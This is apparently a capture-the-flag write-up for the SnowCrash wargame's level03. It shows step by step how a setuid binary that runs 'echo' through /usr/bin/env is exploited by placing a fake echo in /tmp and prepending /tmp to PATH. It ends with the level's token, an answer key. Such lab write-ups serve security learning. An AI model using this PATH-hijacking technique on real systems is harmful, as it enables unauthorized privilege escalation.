# Flag 03
- ll
- found
`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*`

- try to cat -> not interesting
- try to strings it -> I think its a binary, so should to run it
```
level03@SnowCrash:~$ ./level03 
Exploit me
```

- try again with strings
`/usr/bin/env echo Exploit me`

- search in google -> https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code/8304447

- So the vulnerable in this binary is:
  - we can override `PATH` var to redirect to my own `echo` because echo executed using `en` not treated as built-in.

  - I will create my own `echo` to ex `/bin/getflag` and add it to `PATH`

- `echo "/bin/getflag" > /tmp/echo`
- `chmod +x /tmp/echo`
- `PATH=/tmp:$PATH`
- `./level03`

- Done: Check flag.Here is your token : qi0maab88jeaj46qoumi7maus


## Abstract
- Password flag03: 
- Password level04: qi0maab88jeaj46qoumi7maus


